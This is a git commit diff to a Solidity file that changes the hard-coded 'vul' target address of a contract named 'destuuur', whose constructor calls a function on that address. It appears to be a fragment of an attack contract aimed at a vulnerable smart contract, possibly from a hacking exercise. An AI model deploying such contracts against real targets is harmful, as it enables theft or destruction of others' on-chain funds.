812baebac0a6f265fe4bc6339e9774ca14db3802
nikaluka <47041738+nikaluka@users.noreply.github.com>
2020-12-07 15:06:35 +0100

    Update chi.sol

--- chi.sol
+++ chi.sol
@@ -5,7 +5,7 @@ interface qir{
 
    contract destuuur {
      //smeni
-       address payable vul=0xc3Cb563041D3b4e4949b5961f2918149129F2C79;// vul address
+       address payable vul=0x9d3DdBeC4766f27e96DB6D4eF5228944433220a9;// vul address
        constructor() public{
         qir(vul).qiril();
     }
